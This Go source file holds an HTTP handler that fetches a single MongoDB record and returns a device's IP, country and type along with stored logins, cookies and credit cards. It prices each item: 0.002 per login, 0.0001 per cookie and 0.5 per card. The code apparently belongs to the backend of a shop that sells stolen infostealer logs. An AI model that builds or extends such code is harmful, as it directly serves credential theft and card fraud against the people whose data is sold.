package routes

import (
	"context"
	"encoding/json"
	"log"
	"net/http"
	"solomon/api/util"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
)

func ViewHandler(w http.ResponseWriter, r *http.Request, client *mongo.Client, config map[string]string) {
	file := r.FormValue("file")
	if file == "" {
		util.SendErrorResponse(w, "You are missing the file parameter", http.StatusBadRequest)
		return
	}

	pipeline := mongo.Pipeline{
		{{Key: "$match", Value: bson.M{"_id": file}}},
		{{Key: "$project", Value: bson.M{
			"_id":                        1,
			"database.log_date":          bson.M{"$ifNull": []interface{}{"$infomation.date", nil}},
			"information.device_country": bson.M{"$ifNull": []interface{}{"$country", "N/A"}},
			"information.device_image":   bson.M{"$ifNull": []interface{}{"$image", nil}},
			"information.device_type":    bson.M{"$ifNull": []interface{}{"$infomation.device", nil}},
			"information.device_ip":      bson.M{"$ifNull": []interface{}{"$infomation.ip", "N/A"}},
			"device._logins":             bson.M{"$ifNull": []interface{}{"$data.logins", nil}},
			"device._cookies":            bson.M{"$ifNull": []interface{}{"$data.cookies", nil}},
			"device._cards":              bson.M{"$ifNull": []interface{}{"$data.credit_cards", nil}},
			"cost.credit_cost": bson.M{
				"$round": []interface{}{
					bson.M{
						"$add": []interface{}{
							bson.M{"$multiply": []interface{}{bson.M{"$size": "$data.logins"}, 0.002}},
							bson.M{"$multiply": []interface{}{bson.M{"$size": "$data.cookies"}, 0.0001}},
							bson.M{"$multiply": []interface{}{bson.M{"$size": "$data.credit_cards"}, 0.5}},
						},
					},
					2,
				},
			},
		}}},
		{{Key: "$limit", Value: 1}},
	}
	cursor, err := client.Database(config["database"]).Collection(config["collection"]).Aggregate(context.Background(), pipeline)
	if err != nil {
		log.Fatal(err)
	}
	defer cursor.Close(context.Background())

	var result bson.M
	if cursor.Next(context.Background()) {
		if err := cursor.Decode(&result); err != nil {
			log.Fatal(err)
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}
